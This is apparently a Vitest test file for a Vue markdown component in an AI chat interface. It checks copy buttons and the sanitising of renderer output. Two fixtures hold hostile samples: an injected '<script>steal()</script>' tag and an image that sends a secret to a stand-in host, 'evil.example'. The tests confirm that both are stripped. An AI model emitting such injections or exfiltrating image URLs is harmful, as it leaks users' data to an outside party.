// @vitest-environment jsdom
// happy-dom drops <pre> inside DOMPurify, so the sanitiser runs against jsdom here
import { flushPromises, mount } from "@vue/test-utils";
import { afterEach, describe, expect, it, vi } from "vitest";
import { createAi } from "../ai";
import AiMarkdown from "./AiMarkdown.vue";

const ai = (markdown?: (source: string) => string) =>
  createAi({
    backend: { connections: async () => [], models: async () => [], transport: () => async () => new Response("") },
    conversations: { list: async () => [], load: async () => null, save: async () => undefined, remove: async () => undefined },
    preferences: { load: async () => ({}), save: async () => undefined },
    storagePrefix: "markdown-test:",
    markdown,
  });

describe("AiMarkdown", () => {
  afterEach(() => {
    vi.useRealTimers();
  });

  it("copies the code of a block with its copy button", async () => {
    const writeText = vi.fn(async () => undefined);
    Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
    vi.useFakeTimers();
    const w = mount(AiMarkdown, { props: { source: "Dig:\n\n```sh\ndig --burrow badger\n```\n\n```\notter swim\n```", ai: ai() } });
    await flushPromises();
    const buttons = w.findAll("button[data-ai-copy]");
    expect(buttons).toHaveLength(2);
    await buttons[0]!.trigger("click");
    await flushPromises();
    expect(writeText).toHaveBeenCalledWith("dig --burrow badger\n");
    expect(buttons[0]!.classes()).toContain("ai-copied");
    vi.advanceTimersByTime(2000);
    expect(buttons[0]!.classes()).not.toContain("ai-copied");
  });

  it("keeps copy buttons after the source changes", async () => {
    const w = mount(AiMarkdown, { props: { source: "```\nbadger\n```", ai: ai() } });
    await w.setProps({ source: "```\nbadger\n```\n\n```\notter\n```" });
    await flushPromises();
    expect(w.findAll("button[data-ai-copy]")).toHaveLength(2);
  });

  it("uses the app's renderer and still sanitises its output", async () => {
    const render = vi.fn((source: string) => `<p class="badger">${source}</p><script>steal()</script><a data-ai-resource="den://3" href="#">den</a>`);
    const instance = ai(render);
    const open = vi.spyOn(instance, "openResource").mockImplementation(() => undefined);
    const w = mount(AiMarkdown, { props: { source: "otters", ai: instance } });
    expect(render).toHaveBeenCalledWith("otters");
    expect(w.find("p.badger").text()).toBe("otters");
    expect(w.html()).not.toContain("<script");
    await w.find("a[data-ai-resource]").trigger("click");
    expect(w.emitted("resource")![0]).toEqual(["den://3"]);
    expect(open).toHaveBeenCalledWith("den://3");
  });

  it("drops remote images the app's renderer emits and keeps same-origin uploads", () => {
    const w = mount(AiMarkdown, { props: { source: "otters", ai: ai(() => '<img src="https://evil.example/leak?d=secret" alt="leak"><img src="/uploads/den.png" alt="den">') } });
    const images = w.findAll("img");
    expect(images.map((img) => img.attributes("src"))).toEqual([undefined, "/uploads/den.png"]);
    expect(w.html()).not.toContain("evil.example");
  });
});
